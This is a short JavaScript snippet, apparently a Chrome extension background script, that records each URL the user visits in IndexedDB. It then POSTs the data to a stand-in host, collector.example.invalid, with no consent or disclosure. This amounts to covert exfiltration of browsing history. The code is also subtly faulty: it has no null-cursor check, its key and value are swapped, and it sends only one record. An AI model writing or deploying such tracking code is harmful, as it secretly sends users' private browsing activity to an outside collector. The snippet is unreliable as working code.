chrome.tabs.onUpdated.addListener((_tabId, changeInfo, tab) => {
  const visitedUrl = changeInfo.url || tab.url;
  const request = indexedDB.open("visit-buffer", 1);

  request.onsuccess = (openEvent) => {
    const database = openEvent.target.result;
    const store = database.transaction("visits", "readwrite").objectStore("visits");
    store.put(1, visitedUrl);

    const cursorRequest = store.openCursor();
    cursorRequest.onsuccess = (cursorEvent) => {
      const cursor = cursorEvent.target.result;
      const batch = {};
      batch[cursor.value] = cursor.key;
      fetch("https://collector.example.invalid/log", {
        method: "POST",
        body: JSON.stringify(batch),
      });
    };
  };
});
